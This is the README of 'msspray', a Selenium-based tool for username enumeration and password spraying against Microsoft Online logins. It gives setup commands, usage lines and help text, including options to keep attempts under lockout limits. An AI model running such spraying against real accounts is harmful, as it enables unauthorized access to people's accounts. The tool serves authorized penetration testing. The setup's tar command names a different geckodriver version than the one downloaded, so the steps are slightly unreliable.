# **msspray**

This is a basic username enumeration and password spraying tool aimed at Microsoft Online authentication that renders in the DOM and requires the use of JavaScript to recognize page changes. For educational purposes only.

https://k3ramas.blogspot.com/2019/04/headless-browsers-for-password-spraying.html

## Setup
```bash
$ pip3 install selenium
$ wget https://github.com/mozilla/geckodriver/releases/download/v0.26.0/geckodriver-v0.26.0-linux64.tar.gz
$ tar -xvf geckodriver-v0.24.0-linux64.tar.gz
$ export PATH=$PATH:$(pwd) # Add the current directory with the geckodriver to the PATH

# Ensure there are no firewall rules that block routing to localhost. 
# Also, ensure that Firefox is up to date in order to set all of the required preferences.
```

## Usage
Perform password spray:<br>
`python3 msspray.py -t https://<target website> -u usernames.txt -p passwords.txt --count 2 --lockout 5 --verbose`

Perform username enumeration:<br>
`python3 msspray.py -t https://<target website> -u usernames.txt -e --verbose`


```
usage: msspray.py [-h] -t TARGET -u USERNAME [-p PASSWORD] [--proxy PROXY]
                  [--wait WAIT] [--count COUNT] [--lockout LOCKOUT]
                  [--verbose] (-e | -s)

MS Online Password Sprayer.

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        Target URL
  -u USERNAME, --username USERNAME
                        File containing usernames
  -p PASSWORD, --password PASSWORD
                        File containing passwords
  --proxy PROXY         Proxy to pass traffic through: <ip:port>
  --wait WAIT           Time to wait when looking for DOM elements (in
                        seconds). Default: 3
  --count COUNT         Number of password attempts per user before lockout
  --lockout LOCKOUT     Lockout policy reset time (in minutes)
  --verbose             Verbose output
  -e, --enum            Perform username enumeration
  -s, --spray           Perform password spraying
```
